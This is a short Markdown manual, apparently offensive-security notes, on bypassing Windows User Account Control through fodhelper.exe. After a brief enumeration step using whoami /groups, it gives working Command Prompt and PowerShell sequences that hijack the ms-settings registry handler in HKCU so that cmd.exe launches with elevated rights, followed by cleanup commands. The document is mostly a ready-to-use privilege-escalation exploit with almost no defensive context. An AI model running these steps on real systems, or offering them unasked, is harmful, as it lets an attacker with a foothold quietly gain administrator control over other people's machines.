# Manual

## 01 - Detect

TODO: write more about this

### 1.1 - Enumeration

```
C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
..[snip]..
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192

C:\> net localgroup %username%
```

If it's part of the **Administrators Group** you can exploit it with the BypassUAC exploits or another simple method and hopefully it'll work as long it's **autoelevated**.

```
C:\> powershell.exe Start-Process cmd.exe -Verb RunAs

C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
..[snip]..
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288

C:\> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
```

## 02 - Exploit

### 2.1 - Command Prompt

```
C:\> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command

C:\> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d cmd.exe /f

C:\> fodhelper.exe
```

### 2.2 - Powershell

```
PS C:\> New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force

PS C:\> New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force

PS C:\> Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force

PS C:\> Start-Process C:\Windows\System32\fodhelper.exe

PS C:\> Invoke-Item C:\Windows\System32\fodhelper.exe
```

### 2.3 - Cleanup

#### 2.3.1 - Command Prompt

`C:\> reg delete HKCU\Software\Classes\ms-settings\ /f`

#### 2.3.2 - Powershell

`PS C:\> Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force`

---
## References

- [UACME](https://github.com/hfiref0x/UACME)

- [SS64 whoami](https://ss64.com/nt/whoami.html)

- [SS64. Syntax Elevate](https://ss64.com/nt/syntax-elevate.html)